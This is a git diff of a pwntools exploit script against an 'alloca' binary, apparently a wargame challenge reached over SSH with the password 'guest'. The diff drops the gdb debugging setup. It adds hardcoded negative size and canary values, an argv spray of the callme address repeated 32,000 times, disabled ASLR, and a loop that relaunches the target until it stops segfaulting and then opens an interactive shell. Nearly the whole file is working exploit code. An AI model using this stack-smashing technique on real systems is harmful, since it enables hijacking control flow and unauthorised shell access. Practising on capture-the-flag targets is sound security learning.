@@ -1,4 +1,5 @@
 from pwn import *
+import time
 import argh
 
 
@@ -10,51 +11,34 @@ port = 2222
 password = 'guest'
 
 
-script = '''
-b* 0x08048769
-display/16wx $esp
-layout regs
-continue
-'''
-
-
-def communicate(p, size, canary, payload='aaaa'):
+def communicate(p):
     p.recvuntil('here is how to.\n\n')
-    sleep(1)
     p.recvuntil('let me show you.\n\n')
-    sleep(1)
-    p.sendline(str(size))
-    p.sendline(str(canary))
+    p.sendline('-82')
+    p.sendline('-2445310')
     p.recvuntil('\n\n')
-    sleep(1)
-    p.sendline(payload)
+    time.sleep(1)
 
 
-def start_gdb(exe_name):
-    return gdb.debug([exe_name], script)
-
-
-@argh.arg('alloca', type=int, help='Run Remotly')
 @argh.arg('--local', '-l', help='Run Locally')
 @argh.arg('--runpwn', '-r', help='Run Remotly')
-def main(alloca, local=False, runpwn=False):
+def main(local=False, runpwn=False):
     p = None
     bin_path = './alloca'
     e = ELF(bin_path)
-    argv = [bin_path]
+    argv = [bin_path, p32(e.symbols.callme)*32000]
 
-    if local:
-        p = start_gdb(bin_path)
-        # p = process(argv=argv)
-        # sleep(0.5)
-        # gdb.attach(p, script)
-    elif runpwn:
-        s = ssh(user, host, port, password)
-        p = s.process(argv=argv)
+    while True:
+        if local:
+            p = process(argv=argv, env={}, aslr=False)
+        elif runpwn:
+            s = ssh(user, host, port, password)
+            p = s.process(argv=argv, env={}, aslr=False)
 
-    communicate(p, alloca, e.symbols.callme)
-
-    p.interactive()
+        communicate(p)
+        p.wait(2)
+        if p.poll() != 11:
+            p.interactive()
 
 
 if __name__ == '__main__':
